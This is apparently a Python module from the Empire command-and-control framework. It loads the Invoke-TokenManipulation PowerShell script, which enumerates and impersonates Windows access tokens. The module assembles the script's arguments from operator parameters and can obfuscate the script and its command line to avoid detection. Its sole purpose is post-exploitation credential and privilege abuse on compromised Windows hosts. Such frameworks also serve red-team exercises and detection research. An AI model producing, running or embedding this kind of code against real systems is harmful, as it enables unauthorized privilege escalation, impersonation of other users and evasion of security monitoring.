from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-TokenManipulation.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        script_end = "Invoke-TokenManipulation"

        if params['RevToSelf'].lower() == "true":
            script_end += " -RevToSelf"
        elif params['WhoAmI'].lower() == "true":
            script_end += " -WhoAmI"
        elif params['ShowAll'].lower() == "true":
            script_end += " -ShowAll | Out-String"
        else:

            for option, values in params.items():
                if option.lower() != "agent":
                    if values and values != '':
                        if values.lower() == "true":
                            # if we're just adding a switch
                            script_end += " -" + str(option)
                        else:
                            script_end += " -" + str(option) + " " + str(values)

            # try to make the output look nice
            if script.endswith("Invoke-TokenManipulation") or script.endswith("-ShowAll"):
                script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String"
            else:
                script_end += "| Out-String"
                if params['RevToSelf'].lower() != "true":
                    script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'
        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
